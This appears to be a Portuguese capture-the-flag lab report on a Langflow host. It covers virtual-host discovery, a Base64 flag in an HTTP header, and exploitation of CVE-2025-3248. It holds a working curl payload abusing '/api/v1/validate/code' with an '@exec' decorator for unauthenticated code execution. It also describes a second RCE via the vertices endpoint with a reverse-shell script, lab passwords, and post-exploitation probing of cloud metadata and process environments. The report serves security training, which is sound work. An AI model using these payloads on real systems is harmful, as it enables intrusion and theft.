# Relatório Detalhado — CTF Parte 2 (Blogo / Langflow)

## Informações Gerais

**Data de elaboração:** 21 de março de 2026  
**Contexto narrativo:** continuação da linha **Rede Blogo** / grupo **LightBringers** (pentest após incidente). A Parte 1, quando existir no teu disco, costuma estar em `Parte1/RELATORIO_CTF9.md` (site de notícias, cadeia até root noutro alvo); **esta Parte 2** trata de um **outro endereço** exposto no ecossistema Blogo: ambiente de testes com **nginx**, **virtual hosts** e aplicação **Langflow** por trás do subdomínio `flow.projects-blogo.sy`.  
**Alvo principal (exemplo de lab):** `3.89.86.52` (substituir pelo IP atual da plataforma).  
**Domínios lógicos:** `projects-blogo.sy` (landing estática), `flow.projects-blogo.sy` (proxy → Langflow em `127.0.0.1:7860`).  
**Total de flags `Solyd{...}` identificadas neste IP (evidência do lab):** **2** (cabeçalho HTTP + ficheiro `/flag.txt` no sistema onde corre o Langflow).

---

## 1. Reconhecimento Inicial

### 1.1 Scan de portas (Nmap)

**Alvo:** IP fornecido pelo CTF.

**Portas abertas (cenário típico deste lab):**

- **80/tcp** — HTTP (nginx).

**Serviços relevantes:**

- **nginx** na frente; encaminha consoante `Host:`.
- **Langflow** escuta em **127.0.0.1:7860** (visível a partir de enumeração no host após compromisso; não necessariamente exposto diretamente na Internet).

**Observação:** a superfície “óbvia” na porta 80 parece pequena (landing genérica); o caminho do desafio exige **enumeração de virtual host** (subdomínio `flow`).

**Evidência em ficheiro:** `lab/Parte2_nmap_full.txt` (scan com `-sV -sC`) e `lab/Parte2_allports.txt` (varredura TCP completa) sobre **`3.89.86.52`** (`ec2-3-89-86-52.compute-1.amazonaws.com`) — confirmam **apenas 80/tcp aberto**, serviço **http**, **nginx 1.24.0 (Ubuntu)** e título HTTP *Ambiente de Testes*.

### 1.2 Enumeração de virtual hosts

**Técnica:** enviar pedidos HTTP ao mesmo IP com `Host: FUZZ.projects-blogo.sy` e comparar **tamanho** (e conteúdo) da resposta com a landing `projects-blogo.sy`.

**Ferramenta:** `ffuf` com wordlist de subdomínios (ex.: SecLists).

**Resultado:** prefixo **`flow`** produz resposta compatível com **SPA Langflow** (tamanho de corpo distinto da landing ~2711 B vs ~1111 B no exemplo documentado).

### 1.3 Resolução de nomes local

Os domínios `*.projects-blogo.sy` **não resolvem** em DNS público típico do exercício; é necessário mapear no **`/etc/hosts`** do analista:

```text
ALVO_IP    projects-blogo.sy
ALVO_IP    flow.projects-blogo.sy
```

### 1.4 Resumo dos artefactos em `lab/` (o que vale a pena no relatório)

Ficheiros exportados durante o exercício — **não** é necessário anexar os JSON completos ao relatório final; basta **descrever** o que provam (abaixo). **Evitar** copiar para PDF/Markdown público: tokens JWT completos, API keys `sk-...` ou payloads com dados sensíveis reais.

| Ficheiro | O que interessa registar no relatório |
|----------|----------------------------------------|
| `lab/Parte2_nmap_full.txt` | Scan **`-sV -sC -p-`**: confirma **nginx 1.24.0**, título da página default, host EC2. |
| `lab/Parte2_allports.txt` | Scan **`-p-`** rápido: reforça que **só 80/tcp** está aberto ao exterior. |
| `lab/Parte2_ffuf_dirs.json` | **FFUF** com `Host: projects-blogo.sy` e wordlist `dirb/common.txt`: apenas **`/`** e **`/index.html`** com 200 e **~2711 B** — sem paths “escondidos” úteis na landing nesta wordlist. |
| `lab/Parte2_langflow_openapi.json` | **OpenAPI 3.1**, **`info.version`: 1.2.0** — prova documental da versão Langflow (ligação directa a **CVE-2025-3248**) e inventário de rotas API. |
| `lab/Parte2_cve_payload.json` | Exemplo mínimo de **`POST /api/v1/validate/code`** com decorator **`@exec`** e leitura de **`/etc/passwd`** — ilustra o truque do CVE (o relatório pode citar só a ideia; o ficheiro guarda o JSON exacto). |
| `lab/Parte2_admin_token.json` | Prova de **login bem-sucedido** como **admin** (par `access_token` / `refresh_token`). No texto do relatório: mencionar **“JWT Bearer obtido após login”**; **não** colar o token. |
| `lab/Parte2_langflow_user_token.json` | Idem para utilizador **langflow** (`sub` JWT diferente). |
| `lab/Parte2_ctfuser_token.json` | Idem para utilizador **ctfenum2026** (ou outro user de enumeração). |
| `lab/Parte2_api_key_create.json` | Prova de criação de **API key** nomeada (ex.: `ctf-key`) após sessão admin — útil para a cadeia “credencial → API”; **não** reproduzir o valor `sk-...` no relatório. |

---

## 2. Exploração e Exploração de Vulnerabilidades

### 2.1 Flag 1 — Informação em cabeçalho HTTP (virtual host + Base64)

**Localização:** resposta HTTP do vhost **`flow.projects-blogo.sy`** (directiva nginx do tipo `add_header Flag "..." always;`).  
**Tipo:** exposição de informação / configuração de servidor.  
**Severidade:** Baixa a Média (depende do conteúdo; aqui revela flag de desafio).

**Descrição:** a flag **não** aparece no corpo HTML visível; está no cabeçalho **`Flag:`**, codificada em **Base64**.

**Flag (exemplo do lab):**

```text
Solyd{!@#D0m4inAcc3SS3D#*}
```

**Valor Base64 observado (exemplo):**

```text
U29seWR7IUAjRDBtNGluQWNjM1NTM0QjKn0=
```

**Método de descoberta:**

```bash
curl -sI "http://ALVO_IP/" -H "Host: flow.projects-blogo.sy"
echo 'U29seWR7IUAjRDBtNGluQWNjM1NTM0QjKn0=' | base64 -d
```

**Recomendações:**

- Não armazenar segredos em cabeçalhos HTTP de produção.
- Rever configuração nginx (`add_header`) em ambientes públicos.

---

### 2.2 Flag 2 — CVE-2025-3248 (RCE não autenticada) e leitura de `/flag.txt`

**Localização:** ficheiro **`/flag.txt`** no sistema de ficheiros do processo Langflow (contentor/host conforme deploy).  
**Tipo:** **CWE-94** / execução de código por validação insegura de código Python.  
**Severidade:** **Crítica**.

**CVE:** [CVE-2025-3248](https://nvd.nist.gov/vuln/detail/CVE-2025-3248) — versões Langflow **&lt; 1.3.0** (confirmada **1.2.0** via `/openapi.json`).

**Descrição:** o endpoint **`POST /api/v1/validate/code`** processa código Python de forma que **decoradores** (e outros nós AST) são avaliados de modo a permitir **execução de código** sem autenticação. O output pode ser exfiltrado via **mensagem de excepção** na resposta JSON (`function.errors`).

**Flag (exemplo do lab):**

```text
Solyd{0!FL0WFrOmOutsideTO1Ns1d3$%#}
```

**Pedido ilustrativo:**

```bash
curl -sS -X POST "http://ALVO_IP/api/v1/validate/code" \
  -H "Host: flow.projects-blogo.sy" \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"code": "@exec('\''raise Exception(__import__(\"subprocess\").check_output([\"cat\", \"/flag.txt\"]))'\'')\ndef foo():\n  pass"}'
```

**Recomendações:**

- Atualizar Langflow para **≥ 1.3.0** (endpoint protegido por autenticação nas versões corrigidas).
- Não expor Langflow à Internet sem **autenticação forte**, WAF e rede de confiança.
- Monitorizar abusos em `/api/v1/validate/code`.

---

### 2.3 Vetor adicional (documentação técnica) — `POST /api/v1/build/{flow_id}/vertices`

**Tipo:** cadeia semelhante à de **construção de grafo** com código de componente (relacionável conceptualmente com padrões descritos em advisories recentes sobre fluxos públicos / `build_public_tmp` em versões mais novas; em **1.2.0** o endpoint **deprecated** `.../vertices` aceita `nodes`/`edges` no corpo **sem** `CurrentActiveUser`, permitindo **RCE** ao instanciar componentes com `template.code` malicioso).

**Nota:** efeitos colaterais no código injectado devem usar nós **`ast.Assign`** no `prepare_global_scope` (ex.: `_x = ...`); expressões soltas (`Expr`) podem não executar.

**Severidade:** Crítica (se o endpoint permanecer acessível sem autenticação em instalações semelhantes).

**Artefacto no projeto:** `scripts/Parte2_reverse_vertices.py` (reverse shell via thread + ngrok/netcat).

---

### 2.4 Enumeração pós-RCE (sem nova flag `Solyd{...}`)

Foram revistos, entre outros: nginx, `/var/www`, bases **SQLite** do Langflow, respostas volumosas da API, **IMDSv2** (`169.254.169.254`) com `user-data` e documento de identidade da instância, variáveis de ambiente em `/proc/*/environ`.

**Conclusão:** no estado documentado do lab, **não** foi encontrada **terceira** string `Solyd{...}` no mesmo IP além da flag 1 (cabeçalho) e flag 2 (`/flag.txt`). Possíveis explicações: flags noutro host (ex.: VPC `10.0.0.0/16`), formato diferente de “flag”, ou requisito pedagógico distinto.

---

## 3. Análise de Vulnerabilidades Identificadas

### 3.1 Resumo

| # | Vulnerabilidade | Severidade | Impacto | Estado |
|---|-----------------|------------|---------|--------|
| 1 | Flag em cabeçalho HTTP (vhost Langflow) | Baixa / Média | Exposição de flag de CTF | Explorada |
| 2 | CVE-2025-3248 — RCE em `/api/v1/validate/code` | Crítica | Execução de código, leitura de ficheiros | Explorada |
| 3 | RCE via corpo `nodes`/`edges` em `/api/v1/build/.../vertices` (1.2.0) | Crítica | Execução de código sem JWT | Documentada / explorável |
| 4 | Credenciais `.env` vs hash real na BD | Média | Confusão operacional; risco se passwords fracas | Observada |

### 3.2 Notas CVSS (estimativa)

- **CVE-2025-3248:** vetor rede, baixa complexidade, sem privilégios — **CVSS alto/crítico** conforme NVD.
- **Virtual host discovery:** não é CVE; é **configuração + OSINT** de nomes.

---

## 4. Ferramentas e Técnicas Utilizadas

### 4.1 Reconhecimento

- **Nmap** — portas e serviços.
- **curl** — cabeçalhos HTTP, pedidos API.
- **ffuf** — enumeração de subdomínios via `Host:`.

### 4.2 Exploração

- **curl** — payloads JSON para `validate/code`.
- **Python 3** — script `scripts/Parte2_reverse_vertices.py` (opcional).
- **netcat / ngrok** — shell reversa (opcional).

### 4.3 Documentação

- **`openapi.json`** exportado como `lab/Parte2_langflow_openapi.json`.

---

## 5. Credenciais, configuração e síntese pós-shell

**Referência detalhada:** `credenciais.txt` (raiz) e transcrição completa em `lab/servidor.txt`.

### 5.1 Contas Langflow (UI e API)

| Utilizador | Password (lab) | Nota |
|------------|----------------|------|
| **admin** | **blogo123** | Superuser. O `.env` pode listar `LANGFLOW_SUPERUSER_PASSWORD=blogo123#`, mas o **hash na SQLite** corresponde a **`blogo123`** sem `#`. |
| **langflow** | **langflow** | Segundo superuser. |
| **ctfenum2026** | **ctf** | Password **redefinida no painel de admin** durante o exercício; invalida-se se o lab ou a BD forem repostos. |

**Login API (JWT, `application/x-www-form-urlencoded`):**

```bash
curl -sS -X POST "http://ALVO_IP/api/v1/login" \
  -H "Host: flow.projects-blogo.sy" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Accept: application/json" \
  --data-binary "username=admin&password=blogo123&grant_type=password"
```

**Artefactos JSON (podem estar expirados):** `lab/Parte2_*_token.json`, `lab/Parte2_api_key_create.json`.

### 5.2 Ficheiro `.env` do Langflow (observado no lab)

Valores relevantes registados em `credenciais.txt` / exploração em `/opt/langflow-1.2.0-venv/.env`:

- `LANGFLOW_AUTO_LOGIN=False`, serviço em `127.0.0.1:7860`.
- **`LANGFLOW_SECRET_KEY=change-this-to-a-long-random-string`** — placeholder fraco (risco se alguém forjar JWT ou sessões).
- `LANGFLOW_SUPERUSER=admin` e `LANGFLOW_SUPERUSER_PASSWORD=blogo123#` — **diverge** do hash efectivo na BD (usar `blogo123` no login).

### 5.3 Síntese `lab/servidor.txt` (o que interessa para o relatório)

Transcrição de sessão **root** após shell no ambiente do desafio — trechos repetitivos de `ls`/`cd` omitidos; mantêm-se só conclusões úteis:

- **SO:** Ubuntu 24.04 (Noble); hostname no estilo **`ip-10-0-155-111`** (instância EC2 na VPC).
- **Rede:** interface **`10.0.155.111/16`** (`ens5`), gateway **`10.0.0.1`**; bridge Docker **`12.15.11.1/24`** (`br-*`) + **veth** ligado ao contentor — confirma **Docker** no host que serve o lab.
- **Contentor:** ficheiro **`/.dockerenv`** na raiz do sistema onde corre a shell → o analista está (ou esteve) **dentro de um contentor**, não no hypervisor "nu".
- **Serviços à escuta (vistos com `ss`):** **nginx** em `0.0.0.0:80` e **Langflow** em **`127.0.0.1:7860`** — coerente com **proxy nginx** para a app no mesmo namespace de rede.
- **Flag em disco:** **`/flag.txt`** na raiz do contentor (conteúdo alinhado com a flag 2 obtida via RCE).
- **Web estático servido pelo mesmo stack:** **`/var/www/proj`** (landing textual Blogo / aviso TI); **`/var/www/html`** com página default nginx — sem novas strings `Solyd{...}` evidentes nestes ficheiros na enumeração registada.
- **Instalação Langflow:** árvores **`/opt/langflow`** e **`/opt/langflow-1.2.0-venv`** (venv + **`.env`** com as variáveis acima).

**O que *não* aparece como ganho directo nesta transcrição:** nova flag além das já documentadas; `docker.sock` montado no contentor; ou evidência clara de escape para o host EC2 — alinha com a conclusão da secção 2.4 (mais flags provavelmente noutro vetor ou outro alvo).

---

## 6. Flags Capturadas

### Flag 1

```text
Solyd{!@#D0m4inAcc3SS3D#*}
```

**Localização:** cabeçalho HTTP `Flag:` (Base64) no vhost `flow.projects-blogo.sy`.  
**Método:** `curl -sI` + `base64 -d`.

### Flag 2

```text
Solyd{0!FL0WFrOmOutsideTO1Ns1d3$%#}
```

**Localização:** `/flag.txt` no sistema onde corre o Langflow.  
**Método:** CVE-2025-3248 — `POST /api/v1/validate/code`.

---

## 7. Recomendações de Segurança

### 7.1 Imediatas

1. **Atualizar Langflow** para versão **≥ 1.3.0** (mitigar CVE-2025-3248).
2. **Autenticação obrigatória** e exposição apenas em rede restrita / VPN.
3. Rever **nginx**: cabeçalhos com dados sensíveis; separação clara de vhosts.
4. **Rotação de passwords** de superuser e remoção de discrepâncias `.env` vs base de dados.

### 7.2 Médio prazo

1. **WAF** ou API gateway com rate limit em rotas de código / build.
2. **Logging e alertas** em `/api/v1/validate/code` e endpoints de build.
3. **Secrets management** — não depender só de `.env` em contentores públicos.

### 7.3 Longo prazo

1. **Programa de segurança** para aplicações low-code / agentic (revisão de supply chain).
2. **Testes de penetração** periódicos em ambientes que espelhem produção.

---

## 8. Lições Aprendidas

1. O mesmo **IP** pode servir **várias aplicações**; sem o `Host:` correcto o analista vê só a “casca” (landing).
2. **Flags** podem estar em **cabeçalhos**, não só no HTML.
3. Ferramentas **low-code** expostas sem hardening levam rapidamente a **RCE** (CVE-2025-3248).
4. **Versão** da aplicação (`/openapi.json`) é pista directa para pesquisar CVEs.
5. Enumeração exaustiva no host **nem sempre** revela mais flags — alinhar expectativas com o enunciado do CTF.

---

## 9. Conclusão

A Parte 2 do cenário Blogo demonstrou **descoberta de virtual host** (`flow.projects-blogo.sy`), captura de flag em **cabeçalho HTTP** com **Base64**, e compromisso do servidor de aplicação via **CVE-2025-3248**, culminando na leitura de **`/flag.txt`**. O relatório da **Parte 1** (`Parte1/RELATORIO_CTF9.md`, se o tiveres) permanece a referência para a cadeia **LFI → MySQL → adalberto → CVE-2025-27591 (below)** noutro alvo; **esta parte** é **independente** do ponto de vista de IP e vetores web.

**Estado do módulo (lab documentado):** **2** flags `Solyd{...}` identificadas no IP do Langflow; ausência de terceira flag no mesmo formato após enumeração documentada.

---

## 10. Anexos

### 10.1 Ficheiros principais do workspace

| Ficheiro | Descrição |
|----------|-----------|
| `LEIAME.txt` | Índice da pasta do projeto |
| `credenciais.txt` | Credenciais e notas de login (raiz) |
| `Documentacao/resumo.md` | Resumo acessível para quem está a aprender |
| `Documentacao/Parte2_passo_a_passo_flow_e_flags.md` | Passo a passo técnico detalhado |
| `Documentacao/RELATORIO_CTF_Parte2.md` | Este relatório |
| `Documentacao/flag` | Notas consolidadas (flags, IMDS, API) |
| `scripts/Parte2_reverse_vertices.py` | Script de reverse shell (vertices) |
| `lab/Parte2_langflow_openapi.json` | OpenAPI 3.1 / Langflow **1.2.0** (versão + rotas) |
| `lab/Parte2_cve_payload.json` | JSON mínimo PoC `validate/code` (`@exec`, `/etc/passwd`) |
| `lab/Parte2_nmap_full.txt` | Nmap `-sV -sC -p-` (nginx, título) |
| `lab/Parte2_allports.txt` | Nmap `-p-` (confirma só porta 80) |
| `lab/Parte2_ffuf_dirs.json` | FFUF dirs na landing `projects-blogo.sy` |
| `lab/Parte2_*_token.json`, `lab/Parte2_api_key_create.json` | JWT / API key — **segredos; ver secção 1.4** |
| `lab/servidor.txt` | Transcrição pós-shell (síntese na secção 5.3) |

### 10.2 Referências

- CVE-2025-3248 — Langflow `validate/code`.
- Documentação Langflow / release notes ≥ 1.3.0.
- OWASP — injeção de código, exposição de dados em headers.

---

**Relatório gerado em:** 21 de março de 2026  
**Versão:** 1.3 — Parte 2: secção 1.4 (resumo artefactos `lab/`) + referências cruzadas nos scans Nmap.
